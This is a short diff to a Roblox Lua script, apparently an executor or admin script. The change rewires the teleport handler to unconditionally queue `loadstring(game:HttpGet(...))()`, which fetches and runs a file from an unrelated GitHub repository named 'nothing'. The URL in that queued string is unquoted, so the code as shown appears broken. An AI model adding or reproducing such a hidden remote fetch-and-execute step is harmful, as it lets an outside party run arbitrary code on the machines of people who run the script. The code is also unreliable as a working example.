@@ -20,11 +20,11 @@ if not isLegacyChat then
 else
     ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
 end
-
+TeleportCheck = false
 
 Players.LocalPlayer.OnTeleport:Connect(function(State)
-	if KeepInfYield and (not TeleportCheck) and queueteleport then
-		TeleportCheck = true
+	if not (TeleportCheck) then
 		queueteleport("loadstring(game:HttpGet(https://github.com/zakkinajp-cyber/nothing/raw/refs/heads/main/a.lua))()")
+		TeleportCheck = true
 	end
 end)
